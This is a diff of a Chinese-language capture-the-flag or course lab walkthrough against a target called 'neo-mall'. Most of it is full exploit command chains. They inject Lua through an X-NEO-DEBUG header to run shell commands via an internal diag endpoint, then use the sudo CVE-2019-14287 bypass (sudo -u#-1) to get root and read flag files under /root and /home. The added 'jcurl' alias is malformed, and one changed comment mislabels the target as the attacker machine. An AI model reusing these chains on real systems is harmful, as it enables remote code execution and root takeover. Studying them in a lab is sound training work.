@@ -6,10 +6,9 @@
 ## 環境設定
 
 ```bash
-# TARGET為靶機IP
+# TARGET為攻擊機IP
 $TARGET
 export TARGET=192.168.17.133
-#這是我的靶機IP別搞我
 
 #設curl=jcurl+讀懂中文編碼的指令
 alias jcurl='curl -s | python3 -c "import sys,json; d=json.load(sys.stdin); print(json.dumps(d, ensure_ascii=False, indent=2))"'
@@ -17,6 +16,7 @@ alias jcurl='curl -s | python3 -c "import sys,json; d=json.load(sys.stdin); prin
 ```
 
 ---
+
 
 ## 第一階段：資訊挖掘
 
@@ -113,7 +113,7 @@ curl -s -H 'X-NEO-DEBUG: ngx.say(io.popen("curl -s -X POST http://neo-mall:8080/
   http://$TARGET:8080/api/debug-system
 
 # CVE-2019-14287 確認提權成功
-curl -s -H 'X-NEO-DEBUG: ngx.say(io.popen("curl -s -X POST http://neo-mall:8080/api/seller/diag -H \"Content-Type: application/json\" -d \"{\\\"command\\\":\\\"sudo -u#-1 id\\\"}\""):read("*a"))' \
+curl -s -H 'X-NEO-DEBUG: ngx.say(io.popen("curl -s -X POST http://neo-mall:8080/api/seller/diag -H \"Content-Type: application/json\" -d \"{\\\"command\\\":\\\"sudo -u#-1 /bin/bash -c id\\\"}\""):read("*a"))' \
   http://$TARGET:8080/api/debug-system
 ```
 
@@ -123,14 +123,14 @@ curl -s -H 'X-NEO-DEBUG: ngx.say(io.popen("curl -s -X POST http://neo-mall:8080/
 
 ```bash
 # 生成 Flag（學號換成自己的）
-curl -s -H 'X-NEO-DEBUG: ngx.say(io.popen("curl -s -X POST http://neo-mall:8080/api/seller/diag -H \"Content-Type: application/json\" -d \"{\\\"command\\\":\\\"sudo -u#-1 /root/flag.sh 你的學號\\\"}\""):read("*a"))' \
+jcurl -s -H 'X-NEO-DEBUG: ngx.say(io.popen("curl -s -X POST http://neo-mall:8080/api/seller/diag -H \"Content-Type: application/json\" -d \"{\\\"command\\\":\\\"sudo -u#-1 /root/flag.sh 你的學號\\\"}\""):read("*a"))' \
   http://$TARGET:8080/api/debug-system
 
 # 讀取 Root Flag
-curl -s -H 'X-NEO-DEBUG: ngx.say(io.popen("curl -s -X POST http://neo-mall:8080/api/seller/diag -H \"Content-Type: application/json\" -d \"{\\\"command\\\":\\\"sudo -u#-1 /bin/bash -c \\\\\\\"cat /root/root_flag.txt\\\\\\\"\\\"}\""):read("*a"))' \
+jcurl -s -H 'X-NEO-DEBUG: ngx.say(io.popen("curl -s -X POST http://neo-mall:8080/api/seller/diag -H \"Content-Type: application/json\" -d \"{\\\"command\\\":\\\"sudo -u#-1 /bin/bash -c \\\\\\\"cat /root/root_flag.txt\\\\\\\"\\\"}\""):read("*a"))' \
   http://$TARGET:8080/api/debug-system
 
 # 讀取 User Flag
-curl -s -H 'X-NEO-DEBUG: ngx.say(io.popen("curl -s -X POST http://neo-mall:8080/api/seller/diag -H \"Content-Type: application/json\" -d \"{\\\"command\\\":\\\"cat /home/neo-user/user_flag.txt\\\"}\""):read("*a"))' \
+jcurl -s -H 'X-NEO-DEBUG: ngx.say(io.popen("curl -s -X POST http://neo-mall:8080/api/seller/diag -H \"Content-Type: application/json\" -d \"{\\\"command\\\":\\\"cat /home/neo-user/user_flag.txt\\\"}\""):read("*a"))' \
   http://$TARGET:8080/api/debug-system
 ```
